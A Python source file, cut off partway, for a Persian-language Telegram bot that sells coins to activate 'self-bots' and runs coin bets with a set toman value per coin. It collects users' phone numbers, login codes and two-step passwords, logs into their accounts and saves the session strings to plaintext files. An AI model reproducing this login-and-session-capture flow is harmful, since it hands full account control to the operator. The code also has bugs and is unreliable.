import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
import asyncio
import time
import secrets
import os
import subprocess
import sys
import sqlite3
import random
from datetime import datetime

# تنظیمات لاگ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# حالت‌های مکالمه
CHECK_MEMBERSHIP, ACTIVATION_PANEL, GET_PHONE, GET_CODE, COIN_PURCHASE, CONFIRM_PURCHASE = range(6)

class TelegramAuthBot:
    def __init__(self, token, api_id, api_hash):
        self.token = token
        self.api_id = api_id
        self.api_hash = api_hash
        self.application = Application.builder().token(token).build()
        self.user_sessions = {}
        self.user_coins = {}
        self.active_selfbots = {}
        self.invite_links = {}
        self.user_referrals = {}
        self.user_first_start = {}
        self.active_bets = {}  # اضافه شد
        self.group_bets = {}   # اضافه شد
        self.channel_username = "@vip_6ix9ine"
        self.owner_id = "6480226600"
        
        # دیتابیس کاربران
        self.init_users_db()
        
        self.user_coins[self.owner_id] = 999999999
        self.setup_handlers()
    
    def init_users_db(self):
        """ایجاد دیتابیس کاربران"""
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            coins INTEGER DEFAULT 0,
            invited_by INTEGER,
            join_date TEXT,
            is_active INTEGER DEFAULT 1
        )''')
        conn.commit()
        conn.close()
    
    def setup_handlers(self):
        # ابتدا هندلرهای معمولی
        self.application.add_handler(CommandHandler("bet", self.create_bet))
        self.application.add_handler(CommandHandler("gbet", self.create_group_bet))
        self.application.add_handler(CommandHandler("link", self.create_invite_link))
        self.application.add_handler(CommandHandler("balance", self.show_balance))
        self.application.add_handler(CommandHandler("transfer", self.transfer_coins))
        
        # دستورات مالک
        self.application.add_handler(CommandHandler("kasr", self.kasr_coins))
        self.application.add_handler(CommandHandler("id", self.get_user_id))
        self.application.add_handler(CommandHandler("addcoins", self.add_coins))
        
        # هندلر برای پیام‌های متنی
        self.application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^انتقال\s+\d+$'), self.transfer_coins_farsi))
        self.application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^موجودی$'), self.show_balance_farsi))
        
        # هندلر برای شرط‌بندی
        self.application.add_handler(CallbackQueryHandler(self.join_bet, pattern='^join_bet_'))
        self.application.add_handler(CallbackQueryHandler(self.join_group_bet, pattern='^join_gbet_'))
        self.application.add_handler(CallbackQueryHandler(self.cancel_group_bet, pattern='^cancel_gbet_'))
        
        # در آخر Conversation Handler
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('start', self.start)],
            states={
                CHECK_MEMBERSHIP: [
                    CallbackQueryHandler(self.check_membership, pattern='^(check|join)$')
                ],
                ACTIVATION_PANEL: [
                    CallbackQueryHandler(self.activation_panel, pattern='^(activate|support|buy_coins|back|stats|invite)$')
                ],
                GET_PHONE: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_phone_number)
                ],
                GET_CODE: [
                    CallbackQueryHandler(self.verify_code, pattern='^.*$')
                ],
                COIN_PURCHASE: [
                    CallbackQueryHandler(self.coin_purchase, pattern='^.*$')
                ],
                CONFIRM_PURCHASE: [
                    CallbackQueryHandler(self.confirm_purchase, pattern='^(confirm_purchase|cancel_purchase)$')
                ]
            },
            fallbacks=[CommandHandler('cancel', self.cancel)],
            per_message=False
        )
        
        self.application.add_handler(conv_handler)
    
    def is_owner(self, user_id: int) -> bool:
        return user_id == self.owner_id
    
    def create_welcome_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("📥 پیوستن", url="https://t.me/vip_6ix9ine"),
                InlineKeyboardButton("✅ بررسی", callback_data="check")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_activation_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("🚀 فعال سازی سلف", callback_data="activate"),
                InlineKeyboardButton("💰 خرید سکه", callback_data="buy_coins")
            ],
            [
                InlineKeyboardButton("📊 آمار و موجودی", callback_data="stats"),
                InlineKeyboardButton("🎫 لینک دعوت", callback_data="invite")
            ],
            [
                InlineKeyboardButton("🛟 پشتیبانی", url="https://t.me/vip_6ix9ine")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_stats_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("💳 افزایش موجودی", callback_data="buy_coins"),
                InlineKeyboardButton("🎫 لینک دعوت", callback_data="invite")
            ],
            [
                InlineKeyboardButton("🔙 بازگشت", callback_data="back")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_invite_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("📊 آمار دعوت", callback_data="stats"),
                InlineKeyboardButton("💳 خرید سکه", callback_data="buy_coins")
            ],
            [
                InlineKeyboardButton("🔙 بازگشت", callback_data="back")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_phone_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("🔙 بازگشت به منوی اصلی", callback_data="back")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_code_keyboard(self, current_code=""):
        display_code = current_code if current_code else "•••••"
        
        keyboard = [
            [InlineKeyboardButton(f"🔢 کد فعلی: {display_code}", callback_data="display")],
            [
                InlineKeyboardButton("1", callback_data="1"),
                InlineKeyboardButton("2", callback_data="2"),
                InlineKeyboardButton("3", callback_data="3")
            ],
            [
                InlineKeyboardButton("4", callback_data="4"),
                InlineKeyboardButton("5", callback_data="5"),
                InlineKeyboardButton("6", callback_data="6")
            ],
            [
                InlineKeyboardButton("7", callback_data="7"),
                InlineKeyboardButton("8", callback_data="8"),
                InlineKeyboardButton("9", callback_data="9")
            ],
            [
                InlineKeyboardButton("🗑️ حذف", callback_data="delete"),
                InlineKeyboardButton("0", callback_data="0"),
                InlineKeyboardButton("✅ تایید", callback_data="submit")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_coin_keyboard(self, current_amount=""):
        display_amount = current_amount if current_amount else "0"
        
        keyboard = [
            [InlineKeyboardButton(f"💌 تعداد سکه: {display_amount}", callback_data="display_coins")],
            [
                InlineKeyboardButton("1", callback_data="coin_1"),
                InlineKeyboardButton("2", callback_data="coin_2"),
                InlineKeyboardButton("3", callback_data="coin_3")
            ],
            [
                InlineKeyboardButton("4", callback_data="coin_4"),
                InlineKeyboardButton("5", callback_data="coin_5"),
                InlineKeyboardButton("6", callback_data="coin_6")
            ],
            [
                InlineKeyboardButton("7", callback_data="coin_7"),
                InlineKeyboardButton("8", callback_data="coin_8"),
                InlineKeyboardButton("9", callback_data="coin_9")
            ],
            [
                InlineKeyboardButton("🗑️ حذف", callback_data="coin_delete"),
                InlineKeyboardButton("0", callback_data="coin_0"),
                InlineKeyboardButton("✅ تایید", callback_data="coin_submit")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def create_purchase_confirmation_keyboard(self):
        keyboard = [
            [
                InlineKeyboardButton("✅ تأیید خرید", callback_data="confirm_purchase"),
                InlineKeyboardButton("❌ انصراف", callback_data="cancel_purchase")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    def create_bet_keyboard(self, bet_id):
        keyboard = [
            [
                InlineKeyboardButton("🎰 پیوستن به شرط", callback_data=f"join_bet_{bet_id}")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    def create_group_bet_keyboard(self, bet_id):
        keyboard = [
            [
                InlineKeyboardButton("🎰 پیوستن به شرط", callback_data=f"join_gbet_{bet_id}"),
                InlineKeyboardButton("❌ لغو شرط", callback_data=f"cancel_gbet_{bet_id}")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        
        if self.is_owner(user_id):
            self.user_coins[user_id] = 999999999
        
        # بررسی لینک دعوت
        if context.args and len(context.args) > 0:
            invite_code = context.args[0]
            if invite_code in self.invite_links:
                referrer_id = self.invite_links[invite_code]
                
                # اهدای 7 سکه به دعوت کننده
                if referrer_id not in self.user_coins:
                    self.user_coins[referrer_id] = 0
                self.user_coins[referrer_id] += 7
                
                # ذخیره اطلاعات دعوت شونده
                if referrer_id not in self.user_referrals:
                    self.user_referrals[referrer_id] = []
                self.user_referrals[referrer_id].append(user_id)
                
                # اطلاع به دعوت کننده
                try:
                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text=f"🎉 کاربر جدیدی با لینک دعوت شما وارد ربات شد!\n💰 7 سکه به عنوان پاداش دریافت کردید!"
                    )
                except:
                    pass
        
        # هدیه اولیه برای کاربران جدید
        if user_id not in self.user_first_start and not self.is_owner(user_id):
            self.user_first_start[user_id] = True
            if user_id not in self.user_coins:
                self.user_coins[user_id] = 3
                await update.message.reply_text(
                    "🎁 **هدیه ویژه!**\n\n"
                    "به شما 3 سکه رایگان هدیه داده شد!\n"
                    "💰 موجودی فعلی: 3 سکه"
                )
        
        welcome_text = (
            "🌐 𝙅𝙤𝙞𝙣 𝙊𝙪𝙧 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 💫\n\n"
            "Before using the bot, make sure you've joined our official channel 💎\n"
            "👉 𝚃𝚊𝚙 𝚃𝚘 𝙹𝚘𝚞𝚛𝚗: [@vip_6ix9ine]\n"
            "🚀 After joining, come back and tap \"✅ بررسی\""
        )
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=self.create_welcome_keyboard(),
            parse_mode='Markdown'
        )
        return CHECK_MEMBERSHIP
    
    async def check_membership(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == "join":
            await query.edit_message_text(
                "📥 در حال انتقال به کانال...\n\n"
                "پس از پیوستن، روی دکمه '✅ بررسی' کلیک کنید.",
                reply_markup=self.create_welcome_keyboard()
            )
            return CHECK_MEMBERSHIP
        
        await query.edit_message_text("🔍 در حال بررسی عضویت شما...")
        
        try:
            client = TelegramClient(StringSession(), self.api_id, self.api_hash)
            await client.start(bot_token=self.token)
            
            try:
                channel = await client.get_entity(self.channel_username)
                await client(GetParticipantRequest(channel=channel, participant=user_id))
                
                await query.edit_message_text("🎉 عضویت شما تأیید شد!")
                
                activation_text = (
                    "💡 𝐒𝐞𝐭 𝐘𝐨𝐮𝐫 𝐒𝐞𝐥𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 🔋\n\n"
                    "Activate your own self from the menu below 👇\n"
                    "🚀 One tap away from your smart control panel ⚙️"
                )
                
                await query.edit_message_text(
                    text=activation_text,
                    reply_markup=self.create_activation_keyboard(),
                    parse_mode='Markdown'
                )
                
                await client.disconnect()
                return ACTIVATION_PANEL
                
            except UserNotParticipantError:
                await query.edit_message_text(
                    "❌ شما هنوز عضو کانال نشده‌اید!\n\n"
                    "لطفاً ابتدا به کانال @vip_6ix9ine بپیوندید سپس روی '✅ بررسی' کلیک کنید.",
                    reply_markup=self.create_welcome_keyboard()
                )
                await client.disconnect()
                return CHECK_MEMBERSHIP
                
        except Exception as e:
            logging.error(f"Error checking membership: {e}")
            await query.edit_message_text(
                "❌ خطا در بررسی عضویت!\n\n"
                "لطفاً دوباره تلاش کنید.",
                reply_markup=self.create_welcome_keyboard()
            )
            return CHECK_MEMBERSHIP
    
    async def activation_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == "activate":
            user_coins = self.user_coins.get(user_id, 0)
            if user_coins < 3:
                await query.edit_message_text(
                    f"❌ موجودی سکه شما کافی نیست!\n\n"
                    f"💰 موجودی فعلی: {user_coins} سکه\n"
                    f"💸 برای فعال‌سازی سلف به 3 سکه نیاز دارید.\n\n"
                    f"لطفاً از بخش '💰 خرید سکه' اقدام به خرید نمایید.",
                    reply_markup=self.create_activation_keyboard()
                )
                return ACTIVATION_PANEL
            
            phone_text = (
                "📱 لطفاً شماره تلفن خود را به صورت دستی ارسال کنید:\n\n"
                "📝 فرمت پیشنهادی:\n"
                "• +989123456789\n"
                "• 09123456789\n\n"
                "⚠️ شماره باید معتبر و قابل دریافت کد باشد."
            )
            
            await query.edit_message_text(
                phone_text,
                reply_markup=self.create_phone_keyboard()
            )
            return GET_PHONE
        
        elif query.data == "buy_coins":
            coin_text = (
                "💌•••خرید سکه(کوین)•••💌\n\n"
                "💰 هر عدد سکه: 200 تومن\n"
                "‼️ 𝐂𝐨𝐢𝐧 ➜ تعداد سکه مورد نظر خود را وارد کنید\n\n"
                "⌨️ از کیبورد زیر برای وارد کردن تعداد سکه استفاده کنید:"
            )
            
            await query.edit_message_text(
                coin_text,
                reply_markup=self.create_coin_keyboard()
            )
            return COIN_PURCHASE
        
        elif query.data == "stats":
            await self.show_stats_panel(query)
            return ACTIVATION_PANEL
        
        elif query.data == "invite":
            await self.show_invite_panel(query, context)
            return ACTIVATION_PANEL
        
        elif query.data == "support":
            await query.edit_message_text(
                "🛟 در حال انتقال به پشتیبانی...",
                reply_markup=self.create_activation_keyboard()
            )
            return ACTIVATION_PANEL
        
        elif query.data == "back":
            activation_text = (
                "💡 𝐒𝐞𝐭 𝐘𝐨𝐮𝐫 𝐒𝐞𝐥𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 🔋\n\n"
                "Activate your own self from the menu below 👇\n"
                "🚀 One tap away from your smart control panel ⚙️"
            )
            
            await query.edit_message_text(
                activation_text,
                reply_markup=self.create_activation_keyboard()
            )
            return ACTIVATION_PANEL
    
    async def show_stats_panel(self, query):
        """نمایش پنل آمار و موجودی"""
        user_id = query.from_user.id
        user_coins = self.user_coins.get(user_id, 0)
        total_value = user_coins * 200
        referrals_count = len(self.user_referrals.get(user_id, []))
        
        stats_text = (
            f"📊 **آمار و موجودی شما**\n\n"
            f"💰 **موجودی سکه:** {user_coins} سکه\n"
            f"💎 **ارزش ریالی:** {total_value:,} تومن\n"
            f"👥 **تعداد دعوت‌ها:** {referrals_count} نفر\n"
            f"🎁 **سکه از دعوت:** {referrals_count * 7} سکه\n\n"
            f"💡 **نکته:** به ازای هر دعوت موفق 7 سکه پاداش دریافت می‌کنید!"
        )
        
        await query.edit_message_text(
            stats_text,
            reply_markup=self.create_stats_keyboard()
        )
    
    async def show_invite_panel(self, query, context: ContextTypes.DEFAULT_TYPE):
        """نمایش پنل لینک دعوت"""
        user_id = query.from_user.id
        username = query.from_user.username or f"user_{user_id}"
        
        invite_code = secrets.token_urlsafe(8)
        self.invite_links[invite_code] = user_id
        
        invite_link = f"https://t.me/{context.bot.username}?start={invite_code}"
        referrals_count = len(self.user_referrals.get(user_id, []))
        
        invite_text = (
            f"🎫 **لینک دعوت شما**\n\n"
            f"🔗 **لینک:** `{invite_link}`\n\n"
            f"💎 **مزایای دعوت:**\n"
            f"• به ازای هر دعوت: **7 سکه** پاداش\n"
            f"• دعوت شده: **3 سکه** هدیه اولیه\n"
            f"• بدون محدودیت تعداد دعوت\n\n"
            f"📊 **آمار دعوت‌های شما:** {referrals_count} نفر\n"
            f"💰 **سکه‌های کسب شده:** {referrals_count * 7} سکه"
        )
        
        await query.edit_message_text(
            invite_text,
            reply_markup=self.create_invite_keyboard(),
            parse_mode='Markdown'
        )
    
    async def coin_purchase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if 'coin_amount' not in context.user_data:
            context.user_data['coin_amount'] = ''
        
        coin_amount = context.user_data['coin_amount']
        
        if query.data == "coin_delete":
            context.user_data['coin_amount'] = ''
            await query.edit_message_text(
                "🗑️ تعداد سکه پاک شد.\nلطفاً تعداد سکه مورد نظر را وارد کنید:",
                reply_markup=self.create_coin_keyboard()
            )
            return COIN_PURCHASE
        
        elif query.data == "coin_submit":
            if not coin_amount or int(coin_amount) <= 0:
                await query.edit_message_text(
                    "❌ لطفاً تعداد سکه معتبر وارد کنید!",
                    reply_markup=self.create_coin_keyboard(coin_amount)
                )
                return COIN_PURCHASE
            
            coin_count = int(coin_amount)
            total_price = coin_count * 200
            
            purchase_text = (
                f"💌••• تأیید خرید سکه •••💌\n\n"
                f"🩸 𝐌𝐨𝐧𝐞𝐲 ➜ {total_price:,} تومن\n"
                f"💌 𝐂𝐨𝐢𝐧 ➜ {coin_count} سکه\n\n"
                f"       6037 6976 0361 7918\n\n"
                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @mr_amin_vip"
            )
            
            await query.edit_message_text(final_purchase_text)
            
            context.user_data['coin_amount'] = ''
            return ConversationHandler.END
        
        elif query.data.startswith("coin_"):
            digit = query.data.split("_")[1]
            context.user_data['coin_amount'] += digit
            
            updated_amount = context.user_data['coin_amount']
            await query.edit_message_text(
                f"💌 تعداد سکه: {updated_amount}\n\n"
                f"💰 مبلغ قابل پرداخت: {int(updated_amount or 0) * 200:,} تومن\n\n"
                f"⌨️ از کیبورد زیر برای ادامه استفاده کنید:",
                reply_markup=self.create_coin_keyboard(updated_amount)
            )
            return COIN_PURCHASE
        
        elif query.data == "display_coins":
            await query.answer(f"تعداد سکه فعلی: {coin_amount or '0'}")
            return COIN_PURCHASE
    
    async def confirm_purchase(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == "confirm_purchase":
            coin_amount = context.user_data.get('coin_amount', '0')
            coin_count = int(coin_amount)
            total_price = coin_count * 200
            
            if user_id not in self.user_coins:
                self.user_coins[user_id] = 0
            self.user_coins[user_id] += coin_count
            
            final_purchase_text = (
                f"💌••• تأیید خرید سکه •••💌\n\n"
                f"🩸 𝐌𝐨𝐧𝐞𝐲 ➜ {total_price:,} تومن\n"
                f"💌 𝐂𝐨𝐢𝐧 ➜ {coin_count} سکه\n\n"
                f"       6037 6976 0361 7918\n\n"
                f"😘 کاربر گرامی برای خرید ابتدا مبلغ تعیین شده رو به شماره کارت بالا انتقال داده سپس عکس از رسید را برای مالک سلف ارسال کنید ❤️‍🩹 @mr_amin_vip"
            )
            
            await query.edit_message_text(final_purchase_text)
            
            context.user_data['coin_amount'] = ''
            return ConversationHandler.END
        
        elif query.data == "cancel_purchase":
            context.user_data['coin_amount'] = ''
            
            await query.edit_message_text(
                "❌ خرید لغو شد.\n\n"
                "💌•••خرید سکه(کوین)•••💌\n\n"
                "💰 هر عدد سکه: 200 تومن\n"
                "‼️ 𝐂𝐨𝐢𝐧 ➜ تعداد سکه مورد نظر خود را وارد کنید",
                reply_markup=self.create_coin_keyboard()
            )
            return COIN_PURCHASE
    
    async def get_phone_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_input = update.message.text
        user_id = update.message.from_user.id
        
        if user_input == "🔙 بازگشت به منوی اصلی":
            activation_text = (
                "💡 𝐒𝐞𝐭 𝐘𝐨𝐮𝐫 𝐒𝐞𝐥𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 🔋\n\n"
                "Activate your own self from the menu below 👇\n"
                "🚀 One tap away from your smart control panel ⚙️"
            )
            
            await update.message.reply_text(
                activation_text,
                reply_markup=self.create_activation_keyboard()
            )
            return ACTIVATION_PANEL
        
        phone_number = user_input
        phone_number = ''.join(filter(str.isdigit, phone_number))
        
        if phone_number.startswith('98') and len(phone_number) == 11:
            phone_number = '+' + phone_number
        elif phone_number.startswith('09') and len(phone_number) == 11:
            phone_number = '+98' + phone_number[1:]
        elif len(phone_number) == 10 and phone_number.startswith('9'):
            phone_number = '+98' + phone_number
        
        if len(phone_number) < 10:
            await update.message.reply_text(
                "❌ شماره تلفن معتبر نیست!\n\n"
                "لطفاً شماره خود را به درستی وارد کنید:\n"
                "مثال: +989123456789 یا 09123456789\n\n"
                "یا برای بازگشت از دکمه زیر استفاده کنید:",
                reply_markup=self.create_phone_keyboard()
            )
            return GET_PHONE
        
        try:
            processing_msg = await update.message.reply_text("⏳ در حال ارسال کد تأیید...")
            
            result = await self.send_verification_code(phone_number, user_id)
            
            if result['success']:
                self.user_sessions[user_id] = {
                    'phone_number': phone_number,
                    'phone_code_hash': result['phone_code_hash'],
                    'client': result['client'],
                    'timestamp': time.time(),
                    'entered_code': ''
                }
                
                code_message = (
                    "🔓 𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐂𝐨𝐝𝐞 💫\n\n"
                    "Press the button below to receive your login code 🧩\n"
                    "Use it to unlock your personal control system ⚡"
                )
                
                await processing_msg.edit_text(
                    code_message,
                    reply_markup=self.create_code_keyboard()
                )
                
                return GET_CODE
                
            else:
                await processing_msg.edit_text(
                    f"❌ خطا در ارسال کد تأیید:\n{result['error']}\n\n"
                    "لطفاً شماره دیگری وارد نمایید:",
                    reply_markup=self.create_phone_keyboard()
                )
                return GET_PHONE
                
        except Exception as e:
            logging.error(f"Error in get_phone_number: {e}")
            await update.message.reply_text(
                "❌ خطایی رخ داد. لطفاً دوباره تلاش کنید:",
                reply_markup=self.create_phone_keyboard()
            )
            return GET_PHONE
    
    async def send_verification_code(self, phone_number: str, user_id: int):
        try:
            client = TelegramClient(StringSession(), self.api_id, self.api_hash)
            await client.connect()
            
            result = await client.send_code_request(phone_number)
            
            return {
                'success': True,
                'phone_code_hash': result.phone_code_hash,
                'client': client,
                'message': 'کد تأیید با موفقیت ارسال شد'
            }
            
        except Exception as e:
            logging.error(f"Telethon error in send_verification_code: {e}")
            
            error_message = str(e)
            if "FLOOD" in error_message:
                return {'success': False, 'error': 'تعداد درخواست‌ها زیاد است. لطفاً چند دقیقه صبر کنید.'}
            elif "PHONE_NUMBER_INVALID" in error_message:
                return {'success': False, 'error': 'شماره تلفن معتبر نیست.'}
            elif "PHONE_NUMBER_BANNED" in error_message:
                return {'success': False, 'error': 'شماره تلفن مسدود شده است.'}
            else:
                return {'success': False, 'error': f'خطا در ارسال کد: {error_message}'}
    
    async def verify_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if user_id not in self.user_sessions:
            await query.edit_message_text(
                "❌ سشن شما منقضی شده است. لطفاً دوباره /start را ارسال کنید."
            )
            return ConversationHandler.END
        
        session_data = self.user_sessions[user_id]
        
        if query.data == "delete":
            session_data['entered_code'] = ''
            await query.edit_message_text(
                "🗑️ کد وارد شده پاک شد.\nلطفاً کد را دوباره وارد کنید:",
                reply_markup=self.create_code_keyboard()
            )
            return GET_CODE
        
        elif query.data == "submit":
            if len(session_data['entered_code']) != 5:
                await query.edit_message_text(
                    "❌ کد باید ۵ رقمی باشد! لطفاً کد کامل را وارد کنید.",
                    reply_markup=self.create_code_keyboard(session_data['entered_code'])
                )
                return GET_CODE
            
            return await self.check_verification_code(query, context, session_data['entered_code'])
        
        elif query.data in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            if len(session_data['entered_code']) < 5:
                session_data['entered_code'] += query.data
                
                if len(session_data['entered_code']) == 5:
                    await query.edit_message_text(
                        f"✅ کد کامل شد: {session_data['entered_code']}\n"
                        "📲 برای تأیید روی دکمه '✅ تایید' کلیک کنید.",
                        reply_markup=self.create_code_keyboard(session_data['entered_code'])
                    )
                else:
                    await query.edit_message_text(
                        f"🔢 کد فعلی: {session_data['entered_code']}••\n"
                        f"📝 {5 - len(session_data['entered_code'])} رقم باقی مانده",
                        reply_markup=self.create_code_keyboard(session_data['entered_code'])
                    )
            else:
                await query.edit_message_text(
                    "❌ کد کامل شده! برای تأیید روی دکمه '✅ تایید' کلیک کنید.",
                    reply_markup=self.create_code_keyboard(session_data['entered_code'])
                )
            
            return GET_CODE
        
        elif query.data == "display":
            await query.answer(f"کد فعلی: {session_data['entered_code'] or 'خالی'}")
            return GET_CODE
    
    async def check_verification_code(self, query, context: ContextTypes.DEFAULT_TYPE, code: str):
        user_id = query.from_user.id
        session_data = self.user_sessions[user_id]
        client = session_data['client']
        phone_number = session_data['phone_number']
        phone_code_hash = session_data['phone_code_hash']
        
        await query.edit_message_text("⏳ در حال بررسی کد و ورود به اکانت...")
        
        try:
            await client.sign_in(
                phone=phone_number,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            await query.edit_message_text("✅ کد تأیید صحیح است! در حال فعال‌سازی سلف بات...")
            
            session_string = client.session.save()
            
            success = await self.activate_selfbot(session_string, user_id, phone_number)
            
            if success:
                # کسر 3 سکه از موجودی کاربر
                if user_id in self.user_coins and self.user_coins[user_id] >= 3:
                    self.user_coins[user_id] -= 3
                
                await query.message.reply_text(
                    "🎉 **سلف بات با موفقیت فعال شد!**\n\n"
                    "✅ اکانت شما با موفقیت تأیید شد\n"
                    "✅ سلف بات به صورت خودکار اجرا شد\n"
                    "💰 3 سکه از حساب شما کسر شد\n"
                    "🔮 اکنون می‌توانید از دستورات سلف بات استفاده کنید."
                )
            else:
                await query.message.reply_text(
                    "⚠️ **ورود موفق اما خطا در اجرای سلف بات**\n\n"
                    "✅ اکانت شما تأیید شد\n"
                    "❌ خطا در اجرای خودکار سلف بات"
                )
            
            if user_id in self.user_sessions:
                await self.user_sessions[user_id]['client'].disconnect()
                del self.user_sessions[user_id]
            
            return ConversationHandler.END
            
        except Exception as sign_in_error:
            error_msg = str(sign_in_error)
            
            if "SESSION_PASSWORD_NEEDED" in error_msg:
                await query.edit_message_text(
                    "🔐 حساب شما دارای رمز دومرحله‌ای است.\n"
                    "لطفاً رمز عبور خود را به صورت متن ارسال کنید:",
                    reply_markup=self.create_code_keyboard()
                )
                context.user_data['waiting_for_password'] = True
                return GET_CODE
            
            elif "PHONE_CODE_EXPIRED" in error_msg:
                await query.edit_message_text(
                    "❌ کد تأیید منقضی شده است!\n"
                    "لطفاً دوباره /start را ارسال کنید."
                )
            
            elif "CODE_INVALID" in error_msg:
                await query.edit_message_text(
                    "❌ کد تأیید نامعتبر است!\n"
                    "لطفاً کد صحیح را وارد کنید:",
                    reply_markup=self.create_code_keyboard()
                )
                session_data['entered_code'] = ''
                return GET_CODE
            
            else:
                await query.edit_message_text(
                    f"❌ خطا در ورود: {error_msg}\n"
                    "لطفاً دوباره /start را ارسال کنید."
                )
            
            if user_id in self.user_sessions:
                await self.user_sessions[user_id]['client'].disconnect()
                del self.user_sessions[user_id]
            
            return ConversationHandler.END
    
    async def activate_selfbot(self, session_string: str, user_id: int, phone_number: str):
        """فعال‌سازی خودکار سلف بات"""
        try:
            # ذخیره سشن در فایل موقت
            temp_file = f"session_{user_id}.txt"
            with open(temp_file, 'w') as f:
                f.write(session_string)
            
            # اجرای سلف بات در فرآیند جداگانه
            subprocess.Popen([
                sys.executable, 'self.py',
                '--session', temp_file,
                '--api-id', str(self.api_id),
                '--api-hash', self.api_hash
            ])
            
            # ذخیره اطلاعات در دیتابیس
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO users 
                           (user_id, phone, coins, join_date, is_active) 
                           VALUES (?, ?, ?, datetime('now'), 1)''',
                         (user_id, phone_number, self.user_coins.get(user_id, 0)))
            conn.commit()
            conn.close()
            
            return True
        except Exception as e:
            logging.error(f"Error activating selfbot: {e}")
            return False
    
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        
        if user_id in self.user_sessions:
            await self.user_sessions[user_id]['client'].disconnect()
            del self.user_sessions[user_id]
        
        await update.message.reply_text(
            "❌ عملیات لغو شد.\n\n"
            "برای شروع مجدد /start را ارسال کنید."
        )
        return ConversationHandler.END

    # متدهای شرط‌بندی و انتقال سکه
    async def create_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ایجاد شرط‌بندی جدید"""
        user_id = update.message.from_user.id
        username = update.message.from_user.username or f"user_{user_id}"
        
        if not context.args:
            await update.message.reply_text(
                "❌ لطفاً تعداد سکه شرط را مشخص کنید:\n"
                "مثال: `/bet 10`"
            )
            return
        
        try:
            coin_amount = int(context.args[0])
            if coin_amount <= 0:
                await update.message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد!")
                return
            
            if user_id not in self.user_coins or self.user_coins[user_id] < coin_amount:
                await update.message.reply_text(
                    f"❌ موجودی سکه شما کافی نیست!\n"
                    f"💰 موجودی فعلی: {self.user_coins.get(user_id, 0)} سکه\n"
                    f"💸 سکه مورد نیاز: {coin_amount} سکه"
                )
                return
            
            bet_id = str(int(time.time()))
            self.active_bets[bet_id] = {
                'creator_id': user_id,
                'creator_username': username,
                'coin_amount': coin_amount,
                'participants': [user_id],
                'message_id': None
            }
            
            self.user_coins[user_id] -= coin_amount
            
            bet_text = (
                f"🎰●شرط بندی ساخته شده●🎰\n\n"
                f"👤 ساخته شده توسط: @{username}\n"
                f"💌 تعداد کوین: {coin_amount} سکه\n"
                f"💰 مبلغ به قیمت: {coin_amount * 200:,} تومن"
            )
            
            message = await update.message.reply_text(
                bet_text,
                reply_markup=self.create_bet_keyboard(bet_id)
            )
            
            self.active_bets[bet_id]['message_id'] = message.message_id
            
            await update.message.reply_text(
                f"✅ شرط‌بندی با موفقیت ایجاد شد!\n"
                f"💎 {coin_amount} سکه شما بلوکه شد.\n"
                f"⏳ منتظر شرکت کننده دوم باشید..."
            )
            
        except ValueError:
            await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
    
    async def create_group_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
